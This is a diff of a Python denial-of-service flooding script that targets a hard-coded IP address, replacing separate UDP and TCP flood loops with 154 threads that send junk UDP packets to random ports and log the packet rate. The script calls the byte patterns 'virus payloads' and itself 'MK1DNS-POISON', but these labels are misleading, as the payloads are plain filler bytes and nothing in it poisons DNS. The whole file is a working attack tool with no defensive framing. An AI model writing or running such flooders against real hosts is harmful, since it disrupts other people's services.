@@ -1,60 +1,73 @@
 import socket
 import threading
 import time
+import random
 
 target = "62.109.121.42"
+MIN_THREADS = 154
 
-# GLOBAL COUNTERS
-udp_count = 0
-tcp_count = 0
+# Colors
+RED = '\033[91m'
+GREEN = '\033[92m'
+RESET = '\033[0m'
+
+# Virus payloads
+VIRUS_PAYLOADS = [
+    b'\xDE\xAD\xBE\xEF' * 16,  # Memory eater
+    b'\x00' * 64,  # Null virus
+    b'\xFF' * 48,  # Max byte virus
+    b'\xAA\x55\xCC\x33' * 12,  # Alternating virus
+    b'\x80' * 56,  # High bit virus
+    b'\x7F' * 60,  # Max positive virus
+    random.randbytes(64),  # Random virus
+]
+
+# Stats
+total_packets = 0
 start_time = time.time()
 
-# UDP PPS ATTACK
-def udp_pps():
-    global udp_count
+# Virus UDP attack
+def virus_attack(thread_id):
+    global total_packets
+    
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
     while True:
         try:
-            sock.sendto(b'X' * 64, (target, 80))
-            udp_count += 1
+            # Fast small virus payload
+            payload = random.choice(VIRUS_PAYLOADS)
+            port = random.randint(1, 65535)
+            
+            # SEND VIRUS
+            sock.sendto(payload, (target, port))
+            total_packets += 1
+            
         except:
-            pass
+            # Recreate socket if broken
+            try:
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            except:
+                pass
 
-# TCP BANDWIDTH ATTACK  
-def tcp_bandwidth():
-    global tcp_count
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.1)
-            sock.connect((target, 443))
-            sock.send(b'X' * 1460)
-            tcp_count += 1
-            sock.close()
-        except:
-            pass
+# Launch threads
+print(f"{RED}MK1DNS-POISON{RESET} | Target: {target}")
+print(f"{GREEN}Starting {MIN_THREADS} virus threads...{RESET}")
 
-# START 50 THREADS OF EACH
-print("🚀 MAX-OUT ATTACK")
-print(f"🎯 {target}")
-print("💥 UDP: 50 threads (PPS)")
-print("💥 TCP: 50 threads (Bandwidth)")
+for i in range(MIN_THREADS):
+    t = threading.Thread(target=virus_attack, args=(i,))
+    t.daemon = True
+    t.start()
 
-for _ in range(50):
-    threading.Thread(target=udp_pps, daemon=True).start()
-    threading.Thread(target=tcp_bandwidth, daemon=True).start()
-
-# SIMPLE LOG
-last = time.time()
+# Simple logging
 while True:
     time.sleep(1)
-    now = time.time()
+    elapsed = time.time() - start_time
+    pps = int(total_packets / elapsed) if elapsed > 0 else 0
     
-    udp_pps_rate = udp_count / (now - start_time)
-    tcp_bw = (tcp_count * 1460 * 8) / (now - start_time) / 1000000
+    print(f"{RED}MK1DNS-POISON{RESET}:{GREEN}{pps}/s{RESET}")
     
-    print(f"UDP: {int(udp_pps_rate):,}/s | TCP: {tcp_bw:.1f}Mbps")
-    
-    udp_count = 0
-    tcp_count = 0
-    start_time = time.time()
+    # Reset every minute
+    if elapsed >= 60:
+        total_packets = 0
+        start_time = time.time()
